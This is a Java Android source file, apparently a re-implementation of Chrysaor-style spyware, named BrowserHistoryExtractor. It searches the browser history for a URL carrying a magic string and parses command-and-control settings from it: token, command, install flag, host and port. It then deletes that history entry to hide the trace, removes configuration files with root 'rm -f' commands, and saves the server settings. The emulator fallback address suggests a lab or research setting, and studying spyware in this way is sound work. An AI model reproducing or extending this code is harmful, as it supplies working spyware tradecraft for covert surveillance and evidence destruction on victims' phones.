package com.android.chrysaoralike;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import java.net.URLDecoder;

public class BrowserHistoryExtractor {
    private static final String TAG = "BrowserHistoryExtractor";
    private static final String MAGIC_STRING = "rU8IPXbn";
    private static final Uri HISTORY_URI = Uri.parse("content://browser/bookmarks");
    private static final String[] HISTORY_PROJECTION = {"_id", "url", "title", "date"};
    private Context context;

    public BrowserHistoryExtractor(Context context) {
        this.context = context.getApplicationContext();
    }

    public ConfigData extractAndClean() {
        Log.i(TAG, "Starting browser history config extraction...");
        ConfigData config = readConfigFromHistory();
        if (config == null || !config.isValid()) {
            Log.w(TAG, "No valid config found in history.");
            return null;
        }
        deleteMaliciousUrl();
        cleanConfigFiles();
        storeConfigInPrefs(config);
        return config;
    }

    private ConfigData readConfigFromHistory() {
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = null;
        try {
            cursor = resolver.query(HISTORY_URI, HISTORY_PROJECTION, null, null, "date DESC");
            if (cursor == null) return null;
            if (cursor.moveToLast()) {
                do {
                    String url = cursor.getString(1);
                    if (url != null && url.contains(MAGIC_STRING)) {
                        Log.i(TAG, "Found magic URL: " + url);
                        return parseConfigFromUrl(url);
                    }
                } while (cursor.moveToPrevious());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading history", e);
        } finally {
            if (cursor != null) cursor.close();
        }
        return null;
    }

    private ConfigData parseConfigFromUrl(String url) {
        try {
            String query = "";
            int qIndex = url.indexOf('?');
            if (qIndex > 0 && qIndex < url.length() - 1) {
                query = url.substring(qIndex + 1);
            }
            String decoded = URLDecoder.decode(query, "UTF-8");
            String[] pairs = decoded.split("&");
            String token = null, command = null, mcc = null, installFlag = null;
            String host = null, port = null;  // NEW

            for (String pair : pairs) {
                String[] kv = pair.split("=", 2);
                if (kv.length == 2) {
                    String key = kv[0].trim();
                    String value = kv[1].trim();
                    switch (key) {
                        case "t": token = value; break;
                        case "c": command = value; break;
                        case "d": mcc = value; break;
                        case "b": installFlag = value; break;
                        case "h": host = value; break;   // NEW
                        case "p": port = value; break;   // NEW
                    }
                }
            }
            if (token == null || token.isEmpty()) return null;

            // Return config with host/port
            ConfigData config = new ConfigData(token, command, mcc, installFlag);
            config.host = host;
            config.port = port;
            return config;
        } catch (Exception e) {
            Log.e(TAG, "Failed to parse config", e);
            return null;
        }
    }

    private void deleteMaliciousUrl() {
        ContentResolver resolver = context.getContentResolver();
        try {
            String selection = "url LIKE '%" + MAGIC_STRING + "%'";
            int deleted = resolver.delete(HISTORY_URI, selection, null);
            Log.i(TAG, "Deleted " + deleted + " history entries containing '" + MAGIC_STRING + "'");
        } catch (Exception e) {
            Log.e(TAG, "Failed to delete history entries", e);
        }
    }

    private void cleanConfigFiles() {
        RootUtils.runCommand("rm -f /data/myappinfo");
        RootUtils.runCommand("rm -f /system/ttg");
        Log.i(TAG, "Config files cleaned.");
    }

    private void storeConfigInPrefs(ConfigData config) {
        android.content.SharedPreferences.Editor editor = context.getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE).edit();
        editor.putString("token", config.token);
        editor.putString("command", config.command);
        editor.putString("mcc", config.mcc);
        editor.putString("install_flag", config.installFlag);

        // NEW: save server host/port
        if (config.host != null && !config.host.isEmpty()) {
            editor.putString("http_host", config.host);
        } else {
            editor.putString("http_host", "10.0.2.2"); // fallback for emulator
        }
        if (config.port != null && !config.port.isEmpty()) {
            try {
                editor.putInt("http_port", Integer.parseInt(config.port));
            } catch (NumberFormatException e) {
                editor.putInt("http_port", 8080);
            }
        } else {
            editor.putInt("http_port", 8080);
        }
        editor.apply();
        Log.i(TAG, "Config saved with host/port.");
    }
}